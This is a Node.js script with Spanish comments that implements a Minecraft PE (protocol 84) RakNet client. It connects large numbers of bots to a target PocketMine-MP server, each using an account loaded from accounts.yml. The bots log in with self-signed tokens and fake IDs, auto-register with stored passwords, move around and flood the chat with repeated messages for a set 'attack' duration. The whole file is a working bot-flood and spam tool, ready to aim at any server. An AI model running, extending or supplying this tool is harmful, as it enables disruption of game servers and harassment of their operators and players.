#!/usr/bin/env node
/**
 * Bot MCPE/PocketMine-MP — Optimizado
 * Protocolo 84 (MCPE 0.15.10)
 * 
 * USO: node userbot_optimized.js <IP> <PORT> [MAX_BOTS] [TIEMPO] [REG_CMD] [MSG] [INTERVALO]
 * 
 * - Cada bot usa una cuenta ÚNICA del archivo accounts.yml
 * - Máximo de bots = número de cuentas disponibles (o el que especifiques)
 * - Modo silencioso (solo logs importantes)
 */

'use strict';

const dgram = require('dgram');
const zlib = require('zlib');
const crypto = require('crypto');
const fs = require('fs');
const yaml = require('js-yaml');

// ==================== CONFIGURACIÓN ====================
const HOST = process.argv[2] || '127.0.0.1';
const PORT = parseInt(process.argv[3]) || 19132;
const MAX_BOTS_SOLICITADOS = parseInt(process.argv[4]) || 0; // 0 = usar todas las cuentas
const TIEMPO = parseInt(process.argv[5]) || 0;
const REGISTER_RAW = process.argv[6] !== undefined ? process.argv[6] : null;
const MENSAJES_RAW = process.argv[7] || '';
const MSG_INTERVALO = parseInt(process.argv[8]) || 5;

// Constantes de conexión
const MAX_CONCURRENT_CONNECTIONS = 20; // Aumentado para más velocidad
const BOT_SPAWN_TIMEOUT = 30000;
const VERBOSE = false; // Cambiar a true para debug detallado

// Variables globales
let ACCOUNTS = [];
let botsConectados = 0;
let botsActivos = [];
let tiempoTerminado = false;
let globalMsgIdx = 0;
let activeConnections = 0;
let connectionQueue = [];
let totalBotsToStart = 0;
let failedConnections = 0;

// ==================== CARGAR CUENTAS ====================
function loadAccounts() {
    try {
        const yamlFile = fs.readFileSync('accounts.yml', 'utf8');
        const data = yaml.load(yamlFile);
        
        if (data && data.players) {
            for (const [username, info] of Object.entries(data.players)) {
                // Saltar cuentas sin nombre válido
                if (!username || username === '' || username === 'null') continue;
                
                let cid = info.cid;
                
                // Manejar CIDs inválidos
                if (!cid || cid === 0 || cid === '0') {
                    cid = BigInt('0x' + crypto.randomBytes(8).toString('hex'));
                } else if (typeof cid === 'number' && cid < 0) {
                    cid = BigInt('0x' + crypto.randomBytes(8).toString('hex'));
                } else if (typeof cid === 'string' && cid.startsWith('-')) {
                    cid = BigInt('0x' + crypto.randomBytes(8).toString('hex'));
                } else {
                    try {
                        const bigCid = BigInt(cid);
                        if (bigCid < 0n || bigCid > 0xFFFFFFFFFFFFFFFFn) {
                            cid = BigInt('0x' + crypto.randomBytes(8).toString('hex'));
                        } else {
                            cid = bigCid;
                        }
                    } catch(e) {
                        cid = BigInt('0x' + crypto.randomBytes(8).toString('hex'));
                    }
                }
                
                ACCOUNTS.push({
                    username: String(username),
                    password: info.pass || '',
                    cid: cid,
                    ip: info.ip || null
                });
            }
            
            console.log(`📋 Cargadas ${ACCOUNTS.length} cuentas desde accounts.yml`);
            return ACCOUNTS.length > 0;
        }
    } catch (err) {
        console.error(`❌ Error cargando accounts.yml: ${err.message}`);
        return false;
    }
    return false;
}

// Obtener cuenta única (sin reutilizar)
let accountIndex = 0;
let usedAccounts = new Set();

function getUniqueAccount() {
    if (accountIndex >= ACCOUNTS.length) {
        return null;
    }
    return ACCOUNTS[accountIndex++];
}

// ==================== CONSTANTES RAKNET ====================
const MAGIC = Buffer.from([
    0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE,
    0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78,
]);

const MTU_LIST = [1200, 1492, 1464, 1400, 576];

const RAK = {
    PING_UNCONN: 0x01, PONG_UNCONN: 0x1C,
    OPEN_REQ_1: 0x05, OPEN_REPLY_1: 0x06,
    OPEN_REQ_2: 0x07, OPEN_REPLY_2: 0x08,
    CONN_REQ: 0x09, NEW_INC_CONN: 0x10,
    DISCONN: 0x15, CONN_PING: 0x00, CONN_PONG: 0x03,
    ACK: 0xC0, NACK: 0xA0,
};

const P84 = {
    LOGIN: 0x01, PLAY_STATUS: 0x02, SERVER_HS: 0x03, CLIENT_HS: 0x04,
    DISCONNECT: 0x05, RSPACK_INFO: 0x06, RSPACK_STACK: 0x07, RSPACK_RESP: 0x08,
    TEXT: 0x09, SET_TIME: 0x0a, START_GAME: 0x0b, MOVE_PLAYER: 0x13,
    RESPAWN: 0x2d, CHUNK_RADIUS: 0x45, CHUNK_RAD_UPD: 0x46,
};

// ==================== UTILIDADES ====================
function randomXUID() {
    return '25' + Array.from({ length: 14 }, () => Math.floor(Math.random() * 10)).join('');
}

function randomUUID() {
    const h = crypto.randomBytes(16).toString('hex');
    return `${h.slice(0, 8)}-${h.slice(8, 12)}-4${h.slice(13, 16)}-${((parseInt(h[16], 16) & 3) | 8).toString(16)}${h.slice(17, 20)}-${h.slice(20, 32)}`;
}

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
}

// ==================== WRITER / READER ====================
class W {
    constructor() { this.p = []; }
    u8(v) { const b = Buffer.alloc(1); b[0] = v & 0xff; this.p.push(b); return this; }
    u16be(v) { const b = Buffer.alloc(2); b.writeUInt16BE(v >>> 0); this.p.push(b); return this; }
    u32be(v) { const b = Buffer.alloc(4); b.writeUInt32BE(v >>> 0); this.p.push(b); return this; }
    i32be(v) { const b = Buffer.alloc(4); b.writeInt32BE(v | 0); this.p.push(b); return this; }
    i32le(v) { const b = Buffer.alloc(4); b.writeInt32LE(v | 0); this.p.push(b); return this; }
    u64be(v) { const b = Buffer.alloc(8); b.writeBigUInt64BE(BigInt(v)); this.p.push(b); return this; }
    i64be(v) { const b = Buffer.alloc(8); b.writeBigInt64BE(BigInt(v)); this.p.push(b); return this; }
    f32be(v) { const b = Buffer.alloc(4); b.writeFloatBE(v); this.p.push(b); return this; }
    tLE(v) { const b = Buffer.alloc(3); b[0] = v & 0xff; b[1] = (v >> 8) & 0xff; b[2] = (v >> 16) & 0xff; this.p.push(b); return this; }
    raw(b) { this.p.push(Buffer.isBuffer(b) ? b : Buffer.from(b)); return this; }
    magic() { this.p.push(MAGIC); return this; }
    str(s) { const b = Buffer.from(s, 'utf8'); this.u16be(b.length); this.p.push(b); return this; }
    varint(v) { v = v >>> 0; const b = []; do { let x = v & 0x7f; v >>>= 7; if (v) x |= 0x80; b.push(x); } while (v); this.p.push(Buffer.from(b)); return this; }
    rakIP(ip, port) { this.u8(4); ip.split('.').forEach(o => this.u8((~parseInt(o)) & 0xff)); this.u16be(port); return this; }
    nullIP() { this.u8(4); this.u8(0x80).u8(0xFF).u8(0xFF).u8(0xFE).u16be(0); return this; }
    buf() { return Buffer.concat(this.p); }
}

class R {
    constructor(b) { this.b = b; this.p = 0; }
    left() { return this.b.length - this.p; }
    u8() { return this.b.readUInt8(this.p++); }
    u16be() { const v = this.b.readUInt16BE(this.p); this.p += 2; return v; }
    u32be() { const v = this.b.readUInt32BE(this.p); this.p += 4; return v; }
    i32be() { const v = this.b.readInt32BE(this.p); this.p += 4; return v; }
    i64be() { const v = this.b.readBigInt64BE(this.p); this.p += 8; return v; }
    u64be() { const v = this.b.readBigUInt64BE(this.p); this.p += 8; return v; }
    f32be() { const v = this.b.readFloatBE(this.p); this.p += 4; return v; }
    tLE() { const v = this.b[this.p] | (this.b[this.p + 1] << 8) | (this.b[this.p + 2] << 16); this.p += 3; return v; }
    bytes(n) { const v = this.b.slice(this.p, this.p + n); this.p += n; return v; }
    skip(n) { this.p = Math.min(this.p + n, this.b.length); return this; }
}

// ==================== SKIN Y JWT ====================
const STEVE_SKIN = Buffer.alloc(64 * 64 * 4, 0).toString('base64');
let ecKey = null;
try { ecKey = crypto.generateKeyPairSync('ec', { namedCurve: 'P-384' }); } catch (e) { }

function pubKeyB64() {
    return ecKey ? ecKey.publicKey.export({ type: 'spki', format: 'der' }).toString('base64') : 'AAAA';
}

function b64url(d) {
    const b = Buffer.isBuffer(d) ? d : Buffer.from(JSON.stringify(d));
    return b.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function derToRaw(der) {
    let o = 2;
    const rL = der[o + 1]; o += 2;
    const rR = der.slice(o, o + rL); o += rL;
    const sL = der[o + 1]; o += 2;
    const sR = der.slice(o, o + sL);
    const r = Buffer.alloc(48, 0), s = Buffer.alloc(48, 0);
    const rT = rR[0] === 0 ? rR.slice(1) : rR, sT = sR[0] === 0 ? sR.slice(1) : sR;
    rT.copy(r, 48 - rT.length);
    sT.copy(s, 48 - sT.length);
    return Buffer.concat([r, s]);
}

function makeJWT(payload) {
    const pub = pubKeyB64();
    const data = b64url({ alg: 'ES384', x5u: pub }) + '.' + b64url(payload);
    if (!ecKey) return data + '.AAAAAA';
    try {
        const der = crypto.createSign('SHA384').update(data).sign(ecKey.privateKey);
        return data + '.' + derToRaw(der).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    } catch (e) {
        return data + '.AAAAAA';
    }
}

// ==================== PAQUETES ====================
function buildLogin(bot) {
    const pub = pubKeyB64();
    const now = Math.floor(Date.now() / 1000);

    const chain = makeJWT({
        extraData: { displayName: bot.username, identity: bot.uuid, XUID: bot.xuid },
        identityPublicKey: pub,
        nbf: now - 60,
        exp: now + 86400
    });

    const skin = makeJWT({
        ClientRandomId: Number(bot.clientId & 0xFFFFFFFFn),
        ServerAddress: `${HOST}:${PORT}`,
        SkinData: STEVE_SKIN,
        SkinId: 'Standard_Custom',
        CapeData: '',
        SkinGeometryName: 'geometry.humanoid.custom',
        SkinGeometry: '',
        DeviceOS: 1,
        DeviceModel: 'SM-A207M',
        GameVersion: '0.15.10',
        CurrentInputMode: 1,
        DefaultInputMode: 1,
        UIProfile: 0,
        GuiScale: 0,
        LanguageCode: 'es_ES'
    });

    const chainBuf = Buffer.from(JSON.stringify({ chain: [chain] }), 'utf8');
    const skinBuf = Buffer.from(skin, 'utf8');
    const raw = new W().i32le(chainBuf.length).raw(chainBuf).i32le(skinBuf.length).raw(skinBuf).buf();
    const comp = zlib.deflateSync(raw, { level: 7 });
    return Buffer.concat([Buffer.from([0xfe, 0x01]), new W().i32be(84).i32be(comp.length).raw(comp).buf()]);
}

function buildBatch(pkts) {
    const inner = Buffer.concat(pkts.map(p => {
        const lb = Buffer.alloc(4);
        lb.writeUInt32BE(p.length);
        return Buffer.concat([lb, p]);
    }));
    const comp = zlib.deflateSync(inner, { level: 7 });
    return Buffer.concat([Buffer.from([0xfe, 0x06]), new W().i32be(comp.length).raw(comp).buf()]);
}

// ==================== FRAMES ====================
const FRAME_STORE_MAX = 2048;

function _sendFrame(bot, payload, isSplit, splitCount, splitId, splitIdx) {
    if (!bot.sock || bot.isClosing || tiempoTerminado) return;
    const seq = bot.sendSeq++;
    const w = new W().u8(0x84).tLE(seq).u8(isSplit ? 0x70 : 0x60)
        .u16be(payload.length * 8).tLE(bot.msgIndex++).tLE(bot.orderIndex++).u8(0);
    if (isSplit) { w.u32be(splitCount); w.u16be(splitId); w.u32be(splitIdx); }
    w.raw(payload);
    const buf = w.buf();
    bot.sentFrames.set(seq, buf);
    if (bot.sentFrames.size > FRAME_STORE_MAX) bot.sentFrames.delete(bot.sentFrames.keys().next().value);
    bot.sock.send(buf, 0, buf.length, PORT, HOST, () => { });
}

function sendReliable(bot, payload) {
    if (!bot.sock || bot.isClosing || tiempoTerminado) return;
    const MAX = (bot.mtuSize || 1200) - 60;
    if (payload.length <= MAX) { _sendFrame(bot, payload, false, 0, 0, 0); return; }
    const sid = (bot.splitId++) & 0xFFFF, cnt = Math.ceil(payload.length / MAX);
    for (let i = 0; i < cnt; i++) _sendFrame(bot, payload.slice(i * MAX, (i + 1) * MAX), true, cnt, sid, i);
}

function sendGame(bot, pkt) { sendReliable(bot, buildBatch([pkt])); }

function sendACK(bot, nums) {
    if (!bot.sock || bot.isClosing) return;
    const sorted = [...new Set(nums)].sort((a, b) => a - b);
    const recs = [];
    for (let i = 0; i < sorted.length;) {
        let s = sorted[i], e = s;
        while (i + 1 < sorted.length && sorted[i + 1] === sorted[i] + 1) { i++; e = sorted[i]; }
        recs.push([s, e]); i++;
    }
    const w = new W().u8(RAK.ACK).u16be(recs.length);
    for (const [s, e] of recs) s === e ? w.u8(1).tLE(s) : w.u8(0).tLE(s).tLE(e);
    bot.sock.send(w.buf(), 0, w.buf().length, PORT, HOST, () => { });
}

function handleNACK(bot, msg) {
    if (!bot.sock || bot.isClosing) return;
    try {
        const r = new R(msg); r.skip(1);
        const cnt = r.u16be();
        for (let i = 0; i < cnt; i++) {
            const single = r.u8(), s = r.tLE(), e = single ? s : r.tLE();
            for (let seq = s; seq <= e; seq++) {
                const f = bot.sentFrames.get(seq);
                if (f) bot.sock.send(f, 0, f.length, PORT, HOST, () => { });
            }
        }
    } catch (e) { }
}

function chunkRadiusPkt(bot) {
    const id = bot.variantA ? 0x3d : P84.CHUNK_RADIUS;
    return new W().u8(id).varint(Math.floor(Math.random() * 4) + 4).buf();
}

function movePkt(bot) {
    const p = bot.pos;
    if (!bot.onGround) {
        bot.velocityY -= 0.08;
        p.y += bot.velocityY;
        if (p.y <= 64) { p.y = 64; bot.velocityY = 0; bot.onGround = true; }
    } else if (Math.random() < 0.05) {
        bot.velocityY = 0.42;
        bot.onGround = false;
    }
    const id = bot.variantA ? 0x10 : P84.MOVE_PLAYER;
    return new W().u8(id).i64be(bot.entityId)
        .f32be(p.x).f32be(p.y).f32be(p.z)
        .f32be(p.yaw).f32be(p.headYaw).f32be(p.pitch)
        .u8(bot.onGround ? 1 : 0).u8(1).buf();
}

function chatPkt(bot, msg) {
    const id = bot.variantA ? 0x07 : P84.TEXT;
    return new W().u8(id).u8(1).str(bot.username).str(msg).buf();
}

function rspackRespPkt(s) { return new W().u8(P84.RSPACK_RESP).u8(s).u16be(0).buf(); }

// ==================== MANEJADORES ====================
function handleGamePkt(bot, data) {
    if (!data || !data.length || bot.isClosing) return;
    const pid = data[0], r = new R(data); r.skip(1);

    if (pid === P84.PLAY_STATUS) {
        const st = r.i32be();
        if (st === 0) sendGame(bot, chunkRadiusPkt(bot));
        else if (st === 1 || st === 2 || st === 4) cerrarBot(bot);
        else if (st === 3) onSpawn(bot);
        return;
    }
    if (pid === P84.DISCONNECT) { cerrarBot(bot); return; }
    if (pid === P84.START_GAME || pid === 0x09) {
        bot.variantA = (pid === 0x09);
        try {
            r.i32be(); r.u8(); r.i32be(); r.i32be();
            bot.entityId = r.i64be();
            r.i32be(); r.i32be(); r.i32be();
            bot.pos.x = r.f32be(); bot.pos.y = r.f32be(); bot.pos.z = r.f32be();
        } catch (e) { }
        sendGame(bot, chunkRadiusPkt(bot));
        if (!bot.spawnFallback) bot.spawnFallback = setTimeout(() => {
            if (!bot.spawned && !bot.isClosing) onSpawn(bot);
        }, 6000);
        return;
    }
    if (pid === P84.RSPACK_INFO) {
        if (!bot.rpackRespSent) { sendGame(bot, rspackRespPkt(3)); bot.rpackRespSent = true; }
        return;
    }
    if (pid === P84.RSPACK_STACK) {
        if (!bot.rpackDone) { bot.rpackDone = true; sendGame(bot, rspackRespPkt(4)); }
        return;
    }
    if (pid === P84.SERVER_HS) {
        sendGame(bot, new W().u8(P84.CLIENT_HS).buf());
        sendGame(bot, chunkRadiusPkt(bot));
        return;
    }
    if (pid === P84.RESPAWN) {
        try { bot.pos.x = r.f32be(); bot.pos.y = r.f32be(); bot.pos.z = r.f32be(); } catch (e) { }
        sendGame(bot, new W().u8(P84.RESPAWN).f32be(bot.pos.x).f32be(bot.pos.y).f32be(bot.pos.z).buf());
        return;
    }
}

function handleBatch(bot, payload) {
    if (bot.isClosing) return;
    try {
        const r = new R(payload), compLen = r.i32be(), comp = r.bytes(Math.min(compLen, r.left()));
        let inner;
        try { inner = zlib.inflateSync(comp); } catch (e) { inner = zlib.inflateRawSync(comp); }
        const ir = new R(inner);
        while (ir.left() >= 4) {
            const len = ir.u32be();
            if (len === 0 || len > ir.left()) break;
            const pkt = ir.bytes(len);
            handleGamePkt(bot, pkt[0] === 0xfe && pkt.length > 1 ? pkt.slice(1) : pkt);
        }
    } catch (e) { }
}

function handleInner(bot, payload) {
    if (!payload || !payload.length || bot.isClosing) return;
    const pid = payload[0];
    if (pid === RAK.CONN_PING) {
        if (payload.length >= 9) {
            const t = payload.readBigInt64BE(1);
            _sendFrame(bot, new W().u8(RAK.CONN_PONG).i64be(t).i64be(BigInt(Date.now())).buf(), false, 0, 0, 0);
        }
        return;
    }
    if (pid === RAK.CONN_PONG) return;
    if (pid === RAK.DISCONN) { cerrarBot(bot); return; }
    if (pid === RAK.NEW_INC_CONN) { handleRakHandshake(bot, payload); return; }
    if (pid === 0xfe) {
        if (payload.length < 2) return;
        payload[1] === 0x06 ? handleBatch(bot, payload.slice(2)) : handleGamePkt(bot, payload.slice(1));
        return;
    }
    if (pid === 0x06) { handleBatch(bot, payload.slice(1)); return; }
    handleGamePkt(bot, payload);
}

function parseDataPkt(bot, msg) {
    if (bot.isClosing) return;
    const r = new R(msg); r.skip(1);
    const seq = r.tLE();
    bot.ackQueue.push(seq);
    while (r.left() > 0) {
        try {
            const flags = r.u8(), rel = (flags >> 5) & 7, isSplit = (flags >> 4) & 1, bits = r.u16be(), blen = Math.ceil(bits / 8);
            if ([2, 3, 4, 6, 7].includes(rel)) r.tLE();
            if ([1, 3, 4].includes(rel)) { r.tLE(); r.u8(); }
            let sc = 0, si = 0, sx = 0;
            if (isSplit) { sc = r.u32be(); si = r.u16be(); sx = r.u32be(); }
            if (blen <= 0 || blen > r.left()) break;
            const payload = r.bytes(blen);
            if (isSplit) {
                if (!bot.splitMap.has(si)) bot.splitMap.set(si, new Array(sc).fill(null));
                bot.splitMap.get(si)[sx] = payload;
                if (bot.splitMap.get(si).every(x => x !== null)) {
                    handleInner(bot, Buffer.concat(bot.splitMap.get(si)));
                    bot.splitMap.delete(si);
                }
            } else handleInner(bot, payload);
        } catch (e) { break; }
    }
}

function handleRakHandshake(bot, payload) {
    if (bot.isClosing) return;
    const r = new R(payload); r.skip(1);
    let pingTime = 0n;
    try {
        const ipv = r.u8(); r.skip(ipv === 4 ? 6 : 18); r.skip(2);
        for (let i = 0; i < 10; i++) { const v = r.u8(); r.skip(v === 4 ? 6 : 18); }
        pingTime = r.i64be();
    } catch (e) { }
    const hw = new W().u8(0x13);
    hw.rakIP(HOST, PORT);
    for (let i = 0; i < 10; i++) hw.nullIP();
    hw.i64be(pingTime).i64be(BigInt(Date.now()));
    _sendFrame(bot, hw.buf(), false, 0, 0, 0);
    if (bot.phase === 'HANDSHAKING') {
        bot.phase = 'LOGIN';
        setTimeout(() => {
            if (!tiempoTerminado && !bot.isClosing) sendReliable(bot, buildLogin(bot));
        }, randomDelay(100, 500));
    }
}

function handleSocketMessage(bot, msg, sock) {
    if (tiempoTerminado || bot.isClosing || !msg.length) return;
    const pid = msg[0];

    if (bot.phase === 'CONNECTING_2') {
        if (pid === 0x08) {
            clearTimeout(bot.req2RetryT);
            bot.phase = 'HANDSHAKING';
            _sendFrame(bot, new W().u8(RAK.CONN_REQ).u64be(bot.clientId).i64be(BigInt(Date.now())).u8(0).buf(), false, 0, 0, 0);
        }
        return;
    }

    if (pid >= 0x80 && pid <= 0x8F) {
        parseDataPkt(bot, msg);
        if (bot.ackQueue.length && !bot.isClosing) { sendACK(bot, bot.ackQueue); bot.ackQueue = []; }
        return;
    }
    if (pid === RAK.NACK) { handleNACK(bot, msg); return; }

    if (pid === 0x06 && bot.phase === 'CONNECTING_1') {
        clearTimeout(bot.mtuRetryT);
        bot.phase = 'CONNECTING_2';
        const req2 = new W().u8(RAK.OPEN_REQ_2).magic().rakIP(HOST, PORT).u16be(bot.mtuSize).u64be(bot.clientId).buf();
        bot.sock.send(req2, 0, req2.length, PORT, HOST, () => { });
        return;
    }

    if (pid === RAK.PONG_UNCONN && bot.phase === 'UNCONNECTED') {
        clearTimeout(bot.mtuRetryT);
        bot.phase = 'CONNECTING_1';
        bot.sock.send(new W().u8(RAK.OPEN_REQ_1).magic().u8(7).raw(Buffer.alloc(Math.max(0, bot.mtuSize - 46), 0)).buf(), 0, bot.mtuSize - 28, PORT, HOST, () => { });
        return;
    }
}

// ==================== MOVIMIENTO Y CHAT ====================
function startMovement(bot) {
    if (bot.moveTimer || bot.isClosing) return;
    const ox = bot.pos.x, oz = bot.pos.z;
    let dir = Math.random() * Math.PI * 2;
    bot.moveTimer = setInterval(() => {
        if (!bot.spawned || bot.isClosing) { clearInterval(bot.moveTimer); return; }
        bot.pos.yaw = (bot.pos.yaw + (Math.random() - 0.5) * 15 + 360) % 360;
        bot.pos.headYaw = bot.pos.yaw + (Math.random() - 0.5) * 10;
        bot.pos.pitch = Math.max(-90, Math.min(90, bot.pos.pitch + (Math.random() - 0.5) * 8));
        if (Math.random() > 0.4) {
            dir += (Math.random() - 0.5) * 0.5;
            const speed = 0.2 + Math.random() * 0.2;
            bot.pos.x += Math.cos(dir) * speed;
            bot.pos.z += Math.sin(dir) * speed;
            bot.onGround = true;
            const dx = bot.pos.x - ox, dz = bot.pos.z - oz;
            if (dx * dx + dz * dz > 100) dir = Math.atan2(oz - bot.pos.z, ox - bot.pos.x);
        }
        sendGame(bot, movePkt(bot));
    }, 1000 + randomDelay(0, 500));
}

function startChat(bot) {
    if (bot.chatTimer || bot.isClosing || MENSAJES_RAW.length === 0) return;
    const mensajes = MENSAJES_RAW.split('|').filter(m => m.trim()).map(m => m.trim());
    if (mensajes.length === 0) return;
    bot.chatTimer = setInterval(() => {
        if (!bot.spawned || bot.isClosing) return;
        sendGame(bot, chatPkt(bot, mensajes[globalMsgIdx++ % mensajes.length]));
    }, MSG_INTERVALO * 1000 + randomDelay(-1000, 2000));
}

// ==================== SPAWN ====================
function onSpawn(bot) {
    if (bot.spawned) return;
    bot.spawned = true;
    botsConectados++;
    if (!botsActivos.includes(bot)) botsActivos.push(bot);
    if (bot._spawnTimeout) clearTimeout(bot._spawnTimeout);
    activeConnections--;
    
    // Solo mostrar cada 10 bots para menos spam
    if (botsConectados % 10 === 0 || botsConectados === totalBotsToStart) {
        console.log(`✅ Conectados: ${botsConectados}/${totalBotsToStart} | ${bot.username}`);
    } else if (VERBOSE) {
        console.log(`[${bot.username}] ✓ En juego`);
    }
    
    processQueue();

    setTimeout(() => {
        if (!bot.isClosing && !tiempoTerminado) {
            let registerMsg = bot.password;
            if (REGISTER_RAW !== null) {
                if (REGISTER_RAW.startsWith('/')) {
                    registerMsg = `${REGISTER_RAW} ${bot.password}`;
                } else if (REGISTER_RAW !== '') {
                    registerMsg = REGISTER_RAW;
                }
            }
            if (VERBOSE) console.log(`[${bot.username}] Register → "${registerMsg}"`);
            sendGame(bot, chatPkt(bot, registerMsg));
        }
    }, randomDelay(800, 2000));

    setTimeout(() => {
        if (!bot.isClosing && !tiempoTerminado) {
            startMovement(bot);
            startChat(bot);
        }
    }, randomDelay(2500, 4000));
}

function cerrarBot(bot) {
    if (bot.isClosing) return;
    bot.isClosing = true;
    if (bot.spawned) botsConectados--;
    clearTimeout(bot.spawnFallback);
    clearTimeout(bot.mtuRetryT);
    clearTimeout(bot.req2RetryT);
    if (bot.moveTimer) clearInterval(bot.moveTimer);
    if (bot.chatTimer) clearInterval(bot.chatTimer);
    if (bot.keepalive) clearInterval(bot.keepalive);
    if (bot.sock) { try { bot.sock.close(); } catch (e) { } }
}

// ==================== INICIAR BOT ====================
function iniciarBot(numero) {
    const account = getUniqueAccount();
    if (!account) {
        if (failedConnections === 0) {
            console.log(`⚠️ No hay más cuentas disponibles. Iniciados ${numero} bots.`);
        }
        failedConnections++;
        activeConnections--;
        processQueue();
        return;
    }

    const bot = {
        id: numero,
        username: account.username,
        password: account.password,
        uuid: randomUUID(),
        xuid: randomXUID(),
        phase: 'UNCONNECTED',
        clientId: account.cid,
        mtuSize: MTU_LIST[0],
        sendSeq: 0, msgIndex: 0, orderIndex: 0, splitId: 0,
        ackQueue: [], splitMap: new Map(), sentFrames: new Map(),
        entityId: 0n, variantA: false, rpackDone: false, rpackRespSent: false,
        pos: { x: 0, y: 64, z: 0, yaw: 0, headYaw: 0, pitch: 0 },
        velocityY: 0, onGround: true, spawned: false, isClosing: false, registerSent: false, sock: null
    };

    if (VERBOSE) console.log(`🚀 Iniciando ${bot.username} (${numero + 1}/${totalBotsToStart})`);

    bot.sock = dgram.createSocket('udp4');
    bot.sock.on('error', () => { });
    bot.sock.on('message', (msg) => handleSocketMessage(bot, msg, bot.sock));
    bot.sock.bind(0, () => {
        bot.sock.send(new W().u8(RAK.PING_UNCONN).i64be(BigInt(Date.now())).magic().u64be(bot.clientId).buf(), 0, 33, PORT, HOST, () => { });
    });

    bot.keepalive = setInterval(() => {
        if (!bot.isClosing && (bot.phase === 'LOGIN' || bot.spawned))
            _sendFrame(bot, new W().u8(RAK.CONN_PING).i64be(BigInt(Date.now())).buf(), false, 0, 0, 0);
    }, 4000);

    bot._spawnTimeout = setTimeout(() => {
        if (!bot.spawned && !bot.isClosing) { cerrarBot(bot); activeConnections--; processQueue(); }
    }, BOT_SPAWN_TIMEOUT);

    return bot;
}

function processQueue() {
    if (tiempoTerminado || connectionQueue.length === 0) return;
    while (activeConnections < MAX_CONCURRENT_CONNECTIONS && connectionQueue.length > 0) {
        activeConnections++;
        iniciarBot(connectionQueue.shift());
    }
}

// ==================== MAIN ====================
if (!loadAccounts()) {
    console.error('❌ No se pudieron cargar las cuentas. Verifica accounts.yml');
    process.exit(1);
}

// Determinar cuántos bots iniciar
totalBotsToStart = (MAX_BOTS_SOLICITADOS > 0 && MAX_BOTS_SOLICITADOS < ACCOUNTS.length) 
    ? MAX_BOTS_SOLICITADOS 
    : ACCOUNTS.length;

console.log(`\n📡 Servidor: ${HOST}:${PORT}`);
console.log(`👥 Cuentas disponibles: ${ACCOUNTS.length}`);
console.log(`🤖 Bots a conectar: ${totalBotsToStart}`);
console.log(`⚡ Conexiones concurrentes: ${MAX_CONCURRENT_CONNECTIONS}`);
console.log(`⏱️ Tiempo de ataque: ${TIEMPO > 0 ? TIEMPO + 's' : 'Ilimitado'}`);
console.log(`💬 Mensajes: ${MENSAJES_RAW ? 'Activado' : 'Desactivado'}`);
console.log('');

// Iniciar cola de conexiones
for (let i = 0; i < totalBotsToStart; i++) connectionQueue.push(i);
processQueue();

// Timer para finalizar
if (TIEMPO > 0) {
    setTimeout(() => {
        console.log(`\n⏰ Tiempo expirado (${TIEMPO}s). Desconectando ${botsActivos.length} bots...`);
        tiempoTerminado = true;
        botsActivos.forEach(cerrarBot);
        console.log(`✅ Finalizado. Conexiones exitosas: ${botsConectados}/${totalBotsToStart}`);
        process.exit(0);
    }, TIEMPO * 1000);
}

// Manejar salida manual
process.on('SIGINT', () => {
    console.log(`\n🛑 Interrupción manual. Desconectando ${botsActivos.length} bots...`);
    tiempoTerminado = true;
    botsActivos.forEach(cerrarBot);
    console.log(`✅ Finalizado. Conexiones exitosas: ${botsConectados}/${totalBotsToStart}`);
    process.exit(0);
});